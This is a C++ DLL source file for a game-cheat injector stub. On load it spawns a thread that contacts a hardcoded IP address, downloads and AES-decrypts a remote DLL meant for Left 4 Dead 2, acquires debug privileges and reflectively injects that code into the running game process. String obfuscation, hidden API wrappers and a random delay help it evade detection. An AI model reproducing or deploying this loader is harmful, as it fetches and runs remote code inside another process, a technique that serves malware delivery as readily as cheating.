#include "DllMain.h"

//////////////////////////////////////////////////////////////////////////
/*
INTERWEBZ INJECTOR STUB
TODO:
Nothing
*/
//////////////////////////////////////////////////////////////////////////


std::string aes_key = /*G0E2dFdWCvR6dW9WIy1TSmVCf4kqJSmE*/XorStr<0x9B, 33, 0x2751F7C7>("\xDC\xAC\xD8\xAC\xFB\xE6\xC5\xF5\xE0\xD2\xF7\x90\xC3\xFF\x90\xFD\xE2\xD5\x9C\xFA\xFC\xDD\xE7\xF1\xD5\x80\xDE\xC7\xFD\xEB\xD4\xFF" + 0x2751F7C7).s;
std::string aes_iv = /*tzRS8Rl0K46UzbWI*/XorStr<0xFE, 17, 0x9B9F81D0>("\x8A\x85\x52\x52\x3A\x51\x68\x35\x4D\x33\x3E\x5C\x70\x69\x5B\x44" + 0x9B9F81D0).s;
std::string sDecrypted;

VOID showError(char* pszError)
{
	MessageBoxHidden(0, pszError,/*Error*/XorStr<0x3B, 6, 0xB52E90E4>("\x7E\x4E\x4F\x51\x4D" + 0xB52E90E4).s, 0);
}

void InitDllThread(LPARAM lpParam)
{
	initSecurity();
	
	g_Winsock.InitWinsock();
	g_Winsock.Connect(/*37.187.236.54*/XorStr<0x59, 14, 0xE8F59FDF>("\x6A\x6D\x75\x6D\x65\x69\x71\x52\x52\x54\x4D\x51\x51" + 0xE8F59FDF).s);
	CString cstrResponse;
	//g_Winsock.SendHttpGet(/*_INTERWEBZ/csgo/csgobin.php*/XorStr<0x57, 28, 0xBEE0F428>("\x08\x11\x17\x0E\x1E\x0E\x0A\x1B\x1D\x3A\x4E\x01\x10\x03\x0A\x49\x04\x1B\x0E\x05\x09\x05\x03\x40\x1F\x18\x01" + 0xBEE0F428).s, cstrResponse);
	g_Winsock.SendHttpGet(/*_INTERWEBZ/l4d2/l4d2hack.php*/XorStr<0x10, 29, 0x903895E3>("\x4F\x58\x5C\x47\x51\x47\x41\x52\x5A\x43\x35\x77\x28\x79\x2C\x30\x4C\x15\x46\x11\x4C\x44\x45\x4C\x06\x59\x42\x5B" + 0x903895E3).s, cstrResponse);
	g_Winsock.Disconnect();
	g_Winsock.CleanUp();
	std::string sRet((LPCTSTR)cstrResponse);

	sDecrypted = Crypt::decrypt(sRet, aes_key, aes_iv);
		
	HANDLE hFile = NULL;
	HANDLE hModule = NULL;
	HANDLE hProcess = NULL;
	HANDLE hToken = NULL;
	LPVOID lpBuffer = NULL;
	DWORD dwLength = 0;
	DWORD dwBytesRead = 0;
	DWORD dwProcessId = 0;
	TOKEN_PRIVILEGES priv = { 0 };
	
	while (dwProcessId == 0x0){
		dwProcessId = GetProcessIdByName(/*l4d2.exe*/XorStr<0xC0, 9, 0xBA5C2ACB>("\xAC\xF5\xA6\xF1\xEA\xA0\xBE\xA2" + 0xBA5C2ACB).s);
	}


	int iRand = rand() % 10000 + 10000;
	if (dwProcessId != 0x0)
		Sleep(iRand);


	do
	{
		dwLength = sDecrypted.size();

		if (dwLength == INVALID_FILE_SIZE || dwLength == 0)
			showError(/*Failed to get the DLL file size*/XorStr<0xD9, 32, 0x5AD84D50>("\x9F\xBB\xB2\xB0\xB8\xBA\xFF\x94\x8E\xC2\x84\x81\x91\xC6\x93\x80\x8C\xCA\xAF\xA0\xA1\xCE\x89\x99\x9D\x97\xD3\x87\x9C\x8C\x92" + 0x5AD84D50).s);
		lpBuffer = (char*)sDecrypted.c_str();
		if (!lpBuffer)
			showError(/*Failed to get the DLL file size*/XorStr<0xD9, 32, 0x5AD84D50>("\x9F\xBB\xB2\xB0\xB8\xBA\xFF\x94\x8E\xC2\x84\x81\x91\xC6\x93\x80\x8C\xCA\xAF\xA0\xA1\xCE\x89\x99\x9D\x97\xD3\x87\x9C\x8C\x92" + 0x5AD84D50).s);

		if (OpenProcessTokenHidden(GetCurrentProcessHidden(), TOKEN_ADJUST_PRIVILEGES | TOKEN_QUERY, &hToken))
		{
			priv.PrivilegeCount = 1;
			priv.Privileges[0].Attributes = SE_PRIVILEGE_ENABLED;
			if (LookupprivilegeValueHidden(NULL, SE_DEBUG_NAME, &priv.Privileges[0].Luid))
				AdjustTokenPrivilegesHidden(hToken, FALSE, &priv, 0, NULL, NULL);
			CloseHandleHidden(hToken);
		}
		hProcess = OpenProcessHidden(PROCESS_CREATE_THREAD | PROCESS_QUERY_INFORMATION | PROCESS_VM_OPERATION | PROCESS_VM_WRITE | PROCESS_VM_READ, FALSE, dwProcessId);
		if (!hProcess)
			showError(/*Failed to open the target process*/XorStr<0xCD, 34, 0x103A0870>("\x8B\xAF\xA6\xBC\xB4\xB6\xF3\xA0\xBA\xF6\xB8\xA8\xBC\xB4\xFB\xA8\xB5\xBB\xFF\x94\x80\x90\x84\x81\x91\xC6\x97\x9A\x86\x89\x8E\x9F\x9E" + 0x103A0870).s);
		hModule = LoadRemoteLibraryR(hProcess, lpBuffer, dwLength, NULL);
		if (!hModule)
			showError(/*Failed to inject the DLL*/XorStr<0x31, 25, 0xFDF1264D>("\x77\x53\x5A\x58\x50\x52\x17\x4C\x56\x1A\x52\x52\x57\x5B\x5C\x34\x61\x36\x2B\x21\x65\x02\x0B\x04" + 0xFDF1264D).s);
		
		WaitForSingleObjectHidden(hModule, -1);
	} while (0);
	if (lpBuffer)
		HeapFreeHidden(GetProcessHeapHidden(), 0, lpBuffer);
	if (hProcess)
		CloseHandleHidden(hProcess);
	
	FreeLibrary(GetModuleHandleHidden(NULL));
	
}


//===============================================================================================//
// This is a stub for the actuall functionality of the DLL.
//===============================================================================================//
#include "ReflectiveLoader.h"
#include "ReflectiveDLLInjection.h"
// Note: REFLECTIVEDLLINJECTION_VIA_LOADREMOTELIBRARYR and REFLECTIVEDLLINJECTION_CUSTOM_DLLMAIN are
// defined in the project properties (Properties->C++->Preprocessor) so as we can specify our own 
// DllMain and use the LoadRemoteLibraryR() API to inject this DLL.

// You can use this value as a pseudo hinstDLL value (defined and set via ReflectiveLoader.c)
//===============================================================================================//
BOOL AttachDebugConsole(void)
{
	FILE* g_pConStream;

	if (!AttachConsole(ATTACH_PARENT_PROCESS))
	{
		if (!AllocConsole())
			return FALSE;
	}

	if (!SetConsoleTitle("DebugMessages"))
		return FALSE;

	errno_t err = freopen_s(&g_pConStream, "CONOUT$", "w", stdout);

	if (err != 0)
		return FALSE;

	return TRUE;
}

BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD dwReason, LPVOID lpReserved)
{

	if (dwReason == DLL_QUERY_HMODULE)
	{
		if (lpReserved != NULL)
			*(HMODULE *)lpReserved = hAppInstance;		
	}

	if (dwReason == DLL_PROCESS_ATTACH)
	{		
		hAppInstance = hinstDLL;		
		//AttachDebugConsole();
		//_beginthread(InitDllThread, 0, NULL);		
		CreateThreadHidden(NULL,NULL, (LPTHREAD_START_ROUTINE)InitDllThread, hinstDLL, NULL, NULL);
			
	}

	return TRUE;
}